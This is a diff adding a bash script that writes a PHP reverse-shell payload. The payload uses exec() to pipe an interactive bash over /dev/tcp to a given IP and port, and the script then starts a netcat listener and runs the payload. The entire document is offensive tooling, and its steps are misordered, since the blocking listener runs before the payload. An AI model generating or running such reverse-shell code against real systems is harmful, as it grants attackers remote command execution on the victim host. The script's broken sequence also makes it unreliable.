@@ -1,0 +1,23 @@
+#!/bin/bash
+
+if [ "$#" -ne 2 ]; then
+    echo "Usage: Incorrect use IP_ADDRESS PORT"
+    exit 1
+fi
+
+IP_ADDRESS=$1
+PORT=$2
+PHP_BINARY=/usr/bin/php
+TEMP_DIR=$(mktemp -d -t foobar.XXXXX)
+
+# Generate the PHP reverse shell code
+PHP_CODE='<?php exec("/bin/bash -i >& /dev/tcp/'$IP_ADDRESS'/'$PORT' 0>&1"); ?>'
+
+# Write the PHP code to a file
+echo "$PHP_CODE" >/"$TEMP_DIR"/revshell.php
+
+# Start a netcat listener on the specified port
+nc -nvlp $PORT
+
+# Execute the PHP code using the PHP binary
+$PHP_BINARY /"$TEMP_DIR"/revshell.php
